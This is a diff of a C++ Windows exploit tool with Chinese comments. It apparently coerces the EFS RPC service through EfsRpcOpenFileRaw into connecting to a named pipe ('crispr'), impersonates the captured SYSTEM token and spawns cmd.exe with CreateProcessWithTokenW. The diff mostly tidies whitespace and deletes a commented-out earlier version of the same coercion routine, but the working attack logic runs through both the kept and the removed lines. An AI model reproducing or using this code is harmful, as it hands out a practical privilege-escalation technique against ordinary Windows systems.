@@ -2,7 +2,7 @@
 #pragma comment(lib, "RpcRT4.lib")
 #include "efsr_h.h"
 #include <iostream>
-#include <tchar.h>	
+#include <tchar.h>
 #include <strsafe.h>
 #include <sddl.h>
 #include <thread>
@@ -27,7 +27,9 @@ void GetSystemAsImpersonatedUser(HANDLE hToken)
 		CloseHandle(hToken);
 		return;
 	}
+	
 	wprintf(L"[+]DuplicateTokenEx() OK\n");
+
 	if (!CreateProcessWithTokenW(hSystemTokenDup, LOGON_WITH_PROFILE, NULL, L"cmd.exe", dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &si, &pi))
 	{
 		wprintf(L"CreateProcessWithTokenW() failed. Error: %d\n", GetLastError());
@@ -110,16 +112,12 @@ void ConnectEvilPipe(int choice)
 	//释放资源
 	status = RpcStringFree(&pszStringBinding);
 	wprintf(L"RpcStringFree code:%d\n", status);
-
 	RpcTryExcept{
 		PVOID pContent;
 		LPWSTR pwszFileName;
 		pwszFileName = (LPWSTR)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
-		//\\\\127.0.0.1\\C$\\tmp\\test.txt
 		StringCchPrintf(pwszFileName, MAX_PATH, L"\\\\127.0.0.1/pipe/crispr\\C$\\x");
-		
-		//StringCchPrintf(pwszFileName, MAX_PATH, L"\\\\127.0.0.1\\C$\\Users\\test.txt");
-		
+
 		long result;
 		wprintf(L"[*] Invoking EfsRpcOpenFileRaw with target path: %ws\r\n", pwszFileName);
 		switch (choice)
@@ -208,58 +206,6 @@ int main(int argc, char * argv[])
 }
 
 
-/*
-int wmain(int argc, wchar_t* agrv[])
-{
-	RPC_STATUS status;
-	RPC_WSTR pszStringBinding;
-	RPC_BINDING_HANDLE BindingHandle;
-
-	status = RpcStringBindingCompose(
-		NULL,
-		(RPC_WSTR)L"ncacn_np",
-		(RPC_WSTR)L"\\\\127.0.0.1",//这里取NULL也能代表本地连接
-		(RPC_WSTR)L"\\pipe\\lsarpc",
-		NULL,
-		&pszStringBinding
-	);
-	wprintf(L"[+]RpcStringBindingCompose status: %d\n", status);
-	wprintf(L"[*] String binding: %ws\r\n", pszStringBinding);
-	//绑定接口
-	status = RpcBindingFromStringBinding(pszStringBinding, &BindingHandle);
-	wprintf(L"[+]RpcBindingFromStringBinding status: %d\n",status);
-
-	//释放资源
-	status = RpcStringFree(&pszStringBinding);
-	wprintf(L"RpcStringFree code:%d\n", status);
-
-	RpcTryExcept{
-		PVOID pContent;
-		LPWSTR pwszFileName;
-		pwszFileName = (LPWSTR)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
-		//\\\\127.0.0.1\\C$\\tmp\\test.txt
-		StringCchPrintf(pwszFileName, MAX_PATH, L"\\\\127.0.0.1/pipe/crispr\\D$\\x");
-		long result;
-		wprintf(L"[*] Invoking EfsRpcOpenFileRaw with target path: %ws\r\n", pwszFileName);
-		result = Proc0_EfsRpcOpenFileRaw_Downlevel(
-			BindingHandle,
-			&pContent,
-			pwszFileName,
-			0
-		);
-		wprintf(L"[*] EfsRpcOpenFileRaw status code: %d\r\n", result);
-		status = RpcBindingFree(
-			&BindingHandle                   // Reference to the opened binding handle
-		);
-	}
-	RpcExcept(1)
-	{
-		wprintf(L"RpcExcetionCode: %d\n", RpcExceptionCode());
-	}RpcEndExcept
-
-
-}
-*/
 
 // 下面的函数是为了满足链接需要而写的，没有的话会出现链接错误
 void __RPC_FAR* __RPC_USER midl_user_allocate(size_t len)
